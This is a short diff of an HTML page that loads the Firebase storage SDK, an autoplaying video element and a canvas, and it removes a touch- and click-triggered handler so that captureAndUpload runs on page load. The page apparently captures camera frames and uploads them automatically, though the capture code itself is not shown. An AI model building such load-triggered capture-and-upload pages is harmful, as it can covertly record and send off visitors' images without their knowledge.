@@ -23,7 +23,7 @@
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 <div id="status"></div>
-  <div class="abc" ></div>
+  
 <!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
@@ -78,19 +78,6 @@
   window.onload = captureAndUpload;
 </script>
 
-  <script>
-  function captureAndUpload() {
-    console.log("Touch or click detected!");
-    // Your logic here, e.g. uploading a screenshot or sending data
-  }
-
-  document.addEventListener("DOMContentLoaded", () => {
-    // Trigger on mobile touch
-    document.body.addEventListener("touchstart", captureAndUpload);
-
-    // Also trigger on desktop clicks
-    document.body.addEventListener("click", captureAndUpload);
-  });
-</script>
+  
 </body>
   </html>
